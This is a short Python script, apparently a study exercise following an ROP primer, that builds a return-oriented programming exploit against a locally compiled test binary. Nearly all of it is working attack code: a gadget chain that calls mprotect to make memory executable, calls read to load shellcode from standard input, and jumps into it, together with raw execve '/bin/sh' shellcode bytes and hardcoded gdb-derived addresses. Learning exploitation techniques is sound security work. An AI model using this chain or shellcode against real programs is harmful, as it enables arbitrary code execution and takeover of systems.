#!/usr/bin/python

# following along here
# https://speakerd.s3.amazonaws.com/presentations/6486b353d27b45038d6b4286acbc9390/rop-primer.pdf

'''
compile with gcc -m64 -o shellcodeme shellcodeme.c
'''

'''
tl;dr for ROP
for f in function_to_exec():
    push f() addr
    push pNret where n is len(f_argv)
    [ push f_argv[n] for n in f_argv ]

tricky part is getting the intial control of the stack with the leave; ret
and getting the shellcode into a place you can exec. I have a feeling
you won't be able to just read() from stdin every single time, or that
shellcode through read() might be too easy to detect and be obvious
'''

shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

'''
You're going to need to change the addrs of the functions for the ROP chain
'''

#libc_base_addr = 0x7ffff75e8000

# gdb base_addr
libc_base_addr = 0x00007ffff7a15000

import struct
def p(x):
    return struct.pack('<Q', x)

payload = ""
payload += p(0x000000000040062b) # leave; ret
payload += "A"*8 # padding, number of args in teh stack frame for main

## make memory section rwx
## int mprotect(void *addr, size_t len, int prot);
payload += p(0x0000000000400693) # pop rdi; ret
payload += p(0x20000000) # mprotect argv[0] - addr to make executable
payload += p(libc_base_addr + 0x24805) # rop rsi; ret;
payload += p(0x1000) # mprotect argv [1] page-aligned size
payload += p(libc_base_addr + 0x0000000000001b8e) # pop rdx; ret;
payload += p(0x7) # mprotect argv [2] PROT|READ|PROT|WRITE|PROT_EXEC
payload += p(0x00007ffff7b09a20) # mprotect(), function to call

## read shellcode into buffer
## ssize_t read(int fd, void *buf, size_t count);
# argv[0]
payload += p(0x0000000000400693) # pop rdi; ret
payload += p(0x0) # fd = STDIN

# argv[1]
payload += p(libc_base_addr + 0x24805) # rop rsi; ret;
payload += p(0x20000000) #buf

# argv[2]
payload += p(libc_base_addr + 0x0000000000001b8e) # pop rdx; ret;
payload += p(0x200) # len

# function call
payload += p(0x7ffff7b00800) # read@plt, function to call

## return to buffer with shellcode, exec it
payload += p(0x20000000) # ret to first instruction of the shellcode

print payload
